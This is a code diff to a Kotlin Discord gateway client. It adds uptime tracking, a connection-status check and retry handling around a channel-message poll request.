@@ -60,6 +60,7 @@ class DiscordGatewayClient(
     private var restChannelId: String? = null
     private var pollJob: Job? = null
     private var lastPolledMsgId: String? = null
+    private var startTime = 0L
 
     private val httpClient = OkHttpClient.Builder()
         .connectTimeout(15, TimeUnit.SECONDS)
@@ -82,6 +83,7 @@ class DiscordGatewayClient(
         try {
             closing = false
             fatalError = false
+            startTime = System.currentTimeMillis()
             scope = coroutineScope
             debug("start: scope=$scope closing=$closing")
             whPost(JSONObject().apply {
@@ -271,8 +273,7 @@ class DiscordGatewayClient(
                 .url("https://discord.com/api/v10/channels/$chId/messages?limit=1")
                 .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                 .build()
-            val resp = httpClient.newCall(req).execute()
-            resp.use { r ->
+            executeWithRetry(req).use { r ->
                 if (!r.isSuccessful) return
                 val body = r.body?.string() ?: return
                 val arr = JSONArray(body)
@@ -719,4 +720,6 @@ class DiscordGatewayClient(
 
     fun getChannelId(): String? = myChannelId
     fun getDeviceTag(): String = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
+    fun getUptime(): Long = if (startTime > 0) System.currentTimeMillis() - startTime else 0
+    fun isConnected(): Boolean = ws != null && !closing && !fatalError
 }
